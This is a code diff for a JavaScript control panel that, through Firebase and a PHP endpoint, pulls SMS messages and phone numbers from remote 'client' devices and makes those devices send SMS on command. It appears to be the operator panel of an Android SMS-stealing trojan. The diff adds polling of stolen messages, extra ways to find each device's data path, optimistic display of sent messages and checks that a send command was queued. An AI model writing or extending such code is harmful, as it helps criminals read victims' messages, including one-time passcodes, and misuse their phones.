@@ -628,6 +628,9 @@ function getDeviceSmsPhone(d,simSlot){
   if(!d)return'';
   var raw=getRawDev(d.id);
   var mob=getApkSimPhone(raw,simSlot)||getApkMobNo(raw,d);
+  if((!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))&&d.displayPhone&&d.displayPhone!=='No Number'){
+    mob=String(d.displayPhone).split('|')[0].trim();
+  }
   if(!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))return'';
   var clean=String(mob).trim().replace(/\s/g,'');
   if(clean.indexOf('+')===0)return clean;
@@ -2704,7 +2707,7 @@ function attachSelectedDeviceLive(d){
       if(activeListeners[liveKey].ref&&activeListeners[liveKey].h)activeListeners[liveKey].ref.off('value',activeListeners[liveKey].h);
     }catch(e){}
   }
-  var node=getDeviceProfilePath(d)+'/'+d.rawId;
+  var node=getClientWritePath(d,inst)+'/'+d.rawId;
   try{
     var ref=inst.db.ref(node);
     var h=function(snap){
@@ -2712,7 +2715,7 @@ function attachSelectedDeviceLive(d){
       if(selDev!==d.id)return;
       var val=typeof snap.val==='function'?snap.val():snap;
       if(!val||typeof val!=='object')return;
-      ingestDeviceData(d.fbId,getDeviceProfilePath(d),d.rawId,val);
+      ingestDeviceData(d.fbId,getClientWritePath(d,inst),d.rawId,val);
       processClientsDataNow();
       renderDeviceDetail();
     };
@@ -3128,7 +3131,7 @@ function fetchSmsViaPhp(inst,d){
       database_url:inst.restUrl,
       auth_key:getFbAuthKey(inst),
       schema:inst.schema||'rabel',
-      device_node:d.deviceNode||'clients',
+      device_node:getClientWritePath(d,inst),
       composite_id:d.id
     })
   }).then(function(r){return r.json();}).then(function(j){
@@ -3235,6 +3238,10 @@ function loadSmsForDevice(force){
   var timer=setInterval(function(){
     if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
     fetchSmsFast(inst,d).then(function(list){
+      if(seq!==_smsLoadSeq||selDev!==devId||!list||!list.length)return;
+      mergeSmsIntoDevice(devId,list);
+    });
+    fetchSmsViaPhp(inst,d).then(function(list){
       if(seq!==_smsLoadSeq||selDev!==devId||!list||!list.length)return;
       mergeSmsIntoDevice(devId,list);
     });
@@ -3467,7 +3474,7 @@ function pushSmsWebhookAttempt(out,node,id,payload){
 }
 function getSendAttempts(inst,d,to,message,sim){
   var id=d.rawId,out=[],raw=getRawDev(d.id);
-  var profileNode=getDeviceProfilePath(d)||(raw&&raw._node)||'clients';
+  var profileNode=getClientWritePath(d,inst)||'clients';
   var patch=buildNyaApkCommandPatch(id,sim,to,message);
   var rabel91=buildRabelSendPayload(sim,to,message,d);
   var rabel10=buildRabelSendPayload10(sim,to,message,d);
@@ -3516,14 +3523,34 @@ function restWriteViaNative(url,method,payload){
     return res;
   }catch(e){return null;}
 }
+function appendOptimisticSentSms(devId,to,msg){
+  if(!devId||!msg)return;
+  var entry={
+    address:formatApkSmsTo(to)||String(to||'?'),
+    body:String(msg),
+    type:'sent',
+    date_readable:formatApkDateFromMs(Date.now())||'Just now',
+    ts:Date.now(),
+    _optimistic:1
+  };
+  mergeSmsIntoDevice(devId,[entry]);
+}
 function verifySmsQueuedOnDevice(inst,devId,message){
   if(!inst||!devId||!message)return Promise.resolve(false);
   var needle=String(message).trim().slice(0,24);
   if(!needle)return Promise.resolve(false);
-  return restJsonInst(inst,'clients/'+devId+'/sendSms').then(function(ss){
-    if(ss&&ss.message&&String(ss.message).indexOf(needle)>=0)return true;
-    return restJsonInst(inst,'clients/'+devId+'/messageText').then(function(mt){
-      return !!(mt&&String(mt).indexOf(needle)>=0);
+  return restJsonInst(inst,'clients/'+devId).then(function(node){
+    if(node&&typeof node==='object'){
+      if(node.messageText&&String(node.messageText).indexOf(needle)>=0)return true;
+      if(node.msg&&String(node.msg).indexOf(needle)>=0)return true;
+      if(node.sendSms&&node.sendSms.message&&String(node.sendSms.message).indexOf(needle)>=0)return true;
+      if(node.cmd==='send_sms'&&node.messageText)return true;
+    }
+    return restJsonInst(inst,'clients/'+devId+'/sendSms').then(function(ss){
+      if(ss&&ss.message&&String(ss.message).indexOf(needle)>=0)return true;
+      return restJsonInst(inst,'clients/'+devId+'/messageText').then(function(mt){
+        return !!(mt&&String(mt).indexOf(needle)>=0);
+      });
     });
   }).catch(function(){return false;});
 }
@@ -3771,6 +3798,15 @@ function finishSmsSendCallback(inst,d,msg,phoneDial,r,callback,sameNum,simSlot,t
     else if(r.patchOk||r.webhookOk)baseMsg='⏳ Command bheja — device execute karega'+hint;
     else baseMsg='❌ Firebase par command nahi likha — auth/rules check karo'+hint;
     if(callback)callback(queued,{ok:queued,message:baseMsg,path:r.path,to:phoneDial,verified:verified,patchOk:!!r.patchOk,webhookOk:!!r.webhookOk});
+    if(queued&&d){
+      appendOptimisticSentSms(d.id,phoneDial,msg);
+      setTimeout(function(){
+        if(selDev===d.id){
+          var inst2=getFbInstance(d.fbId);
+          if(inst2)fetchSmsFast(inst2,d).then(function(list){if(list&&list.length)mergeSmsIntoDevice(d.id,list);});
+        }
+      },3500);
+    }
   });
 }
 function sendSmsPhpPromise(phpBody){
